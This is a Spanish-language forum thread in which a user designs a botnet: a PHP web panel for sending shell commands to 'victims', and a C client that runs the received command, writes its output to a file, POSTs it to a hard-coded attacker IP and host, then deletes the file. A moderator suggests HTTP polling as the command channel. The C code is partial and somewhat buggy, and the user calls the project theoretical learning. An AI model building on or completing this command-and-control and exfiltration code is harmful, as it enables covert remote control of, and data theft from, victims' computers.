@@ -1,0 +1,173 @@
+ Hola, tengo pensado controlar a partir de un servidor web que corra un script PHP una botnet (pero esto en teoría OJO, aprendizaje nunca práctica que luego...), ahora bien, los clientes estaría en C o C++, iré subiendo código y editando mensajes acerca del proyecto, la idea es poder gestionar desde el servidor web a las víctimas a través de una SHELL, lo que peor llevo son sockets así que una ayuda no vendrá mal, una guía o algo iré subiendo código.
+
+Edito: subiré la carpeta entera del proyecto web si es necesario, y espero mejoras y consejos xD, gracias.
+
+Saludos.
+
+
+« Última modificación: 15 Septiembre 2014, 23:33 pm por Kaxperday » 	En línea
+Cuando el poder económico parasita al político ningún partido ni dictador podrá liberarnos de él. Se reserva el 99% ese poder.
+engel lex
+Moderador Global
+***
+Desconectado Desconectado
+
+Mensajes: 15.514
+
+
+
+Ver Perfil
+	
+	Re: Controlar botnet con PHP
+« Respuesta #1 en: 16 Septiembre 2014, 03:23 am »
+	
+no es necesario sockets a menos que quieras una comunicación compleja, puedes usar los protocolos html standard
+
+colocas en la pagina x el comando a ejecutar y lo ejecutan, si quieres comunicación de vuelta, lo envían por post y listo... si quieres que uno de ellos se conecte contigo le pasas tu ip con un comando especial y listo... eso si, la técnica es el pivote mismo de la red... le haces ingeniería inversa a un bot, y tienen evidencia suficiente para encarcelarte o por lo menos pierdes la red
+ 
+ 
+
+
+	En línea
+El problema con la sociedad actualmente radica en que todos creen que tienen el derecho de tener una opinión, y que esa opinión sea validada por todos, cuando lo correcto es que todos tengan derecho a una opinión, siempre y cuando esa opinión pueda ser ignorada, cuestionada, e incluso ser sujeta a burla, particularmente cuando no tiene sentido alguno.
+Kaxperday
+
+
+Desconectado Desconectado
+
+Mensajes: 702
+
+
+The man in the Middle
+
+
+Ver Perfil WWW
+	
+	Re: Controlar botnet con PHP
+« Respuesta #2 en: 16 Septiembre 2014, 13:58 pm »
+	
+Gracias por tu respuesta engel, he estado trabajando hasta ahora en ello. He protegido directorios, he conseguido acceder a directorios externos al actual, estética de la web y demás blablas.
+
+Lo que tengo es esto en el php que controlaría la botnet:
+(He borrado los contenedores para ir al grano y que no se alargue el code).
+
+Código
+
+    <html> 
+    <head> 
+    <title>Mi botnet</title>
+    <form action="bot.php" method="GET" > 
+    <sub style="color: #000000">Comando a interpretar</sub>
+    <input type="Text" name="com" size="35" maxlength="100">
+    <sub style="color: #000000">Seleccione bot (si no todos serán objetivos)</sub>
+    <input type="Text" name="bot" size="8" maxlength="20">
+    <input type="Submit" value="ENVIAR">
+    </form>
+    <?
+    $comando = $_GET['com'];
+    $bot = $_GET['bot'];
+    if(strcmp($bot,"")==0)//mando comado a todos
+    {
+     
+    }
+    else//busco y mando comando solo al indicado
+    {
+     
+    }
+    //Aqui debería mandar la cadena de texto al cliente para que lo ejecute en la cmd y genere un archivo, que luego lo subiré
+    //con un POST su contenido, cargándolo en una variable y mostrándolo.
+    ?>
+    </div>
+    </center>
+    </body> 
+    </html>
+     
+
+
+El PHP lo que hace es recoger 2 variables que son el comando a interpretar en la SHELL del cliente, y el cliente objetivo al que se desearía interpretar, si la variable está vacía se ejecutaría a todos. Lo que no sé es como mandar desde el servidor esas cadenas con el comando a los clientes que estarían conectados, esa es la clave. Tanto para enviarlo en el PHP como para recibirlo en el C.
+
+En el lado del C tengo esto:
+
+Código
+
+    #define IP "48.123.321.123"
+    #define PUERTO 80
+     
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <windows.h>
+    #include <direct.h>
+    #include <conio.h>
+    #include <time.h>
+    #include <math.h>
+     
+    int main()
+    {
+        char cola[20]=">data.txt",comando[100];
+        //recibiría el comando
+        strcat(comando,cola);
+        system(comando);
+        conecta("data.txt");//sube la variable del usuario y contenido del archivo
+        //(lo que devolvio la cmd) para cargar en vars en el PHP y mostrar allí
+        return 0;
+    }
+     
+    void conecta(char nombre[])
+    {
+        FILE *dat;
+        WSADATA wsa;
+        int sok,len,i=0;
+        struct sockaddr_in dir;
+        char buf[60384],cad[60384],aux[10],borra[50]="del ",car;
+        WSAStartup(MAKEWORD(2,0),&wsa);
+        if((sok=socket(AF_INET,SOCK_STREAM,0))==-1){}
+        else{
+            dir.sin_family=AF_INET;
+            dir.sin_port=htons(PUERTO);
+            dir.sin_addr.s_addr=inet_addr(IP);
+            strcat(cad,"n=");
+            strcat(cad,nombre);
+            strcat(cad,"&b=");
+            dat=fopen(nombre,"rt");
+            if(nombre==NULL)
+            {
+                exit(0);
+            }
+            while(car!=EOF)
+            {
+                i++;
+                fseek(dat,-i,SEEK_END);
+                car=fgetc(dat);
+                cad[strlen(cad)]=car;
+            }
+            fclose(dat);
+            len=strlen(cad);
+            printf("%s",cad);
+            itoa(len,aux,10);
+            strcpy(buf,"POST direcotior_protegido/bot.php HTTP/1.1\r\n");
+            strcat(buf,"Host: hostquesea.com\r\n");
+            strcat(buf,"Content-type: application/x-www-form-urlencoded\r\n");
+            strcat(buf,"Content-length: ");
+            strcat(buf,aux);
+            strcat(buf,"\r\n\r\n");
+            strcat(buf,cad);
+            connect(sok,(struct sockaddr*)&dir,sizeof(dir));
+            send(sok,buf,strlen(buf),0);
+            strcat(borra,nombre);
+            system(borra);
+        }
+    }
+     
+     
+
+
+Esto sería ya sabéis me falta mantener una conexión constante entre cliente y server y poder mandar esos comandos desde el server.
+
+OJO a lo de directorio protegido (donde se encuentra el bot.php), porque al estarlo probablemente no me deje hacer POST a esa dirección es por eso que me pregunto que había que poner en la cabecera del POST para autentificarse porque lo busco pero no lo encuentro quizá lo sabéis.
+
+También he de decir engel que busco aprender no crear mi propia botnet pero si saber como hacerla pues me atrae, otra cosa sería dar el paso de ponerla en funcionamiento e infectar ordenadores se me podría caer el pelo y es algo a lo que no aspiro.
+
+Saludos, a la espera de ayuda, seguiré subiendo code y actualizándolo.
+Toda mejora o consejo es bienvenida.
+« Última modificación: 16 Septiembre 2014, 15:18 pm por Kaxperday » 
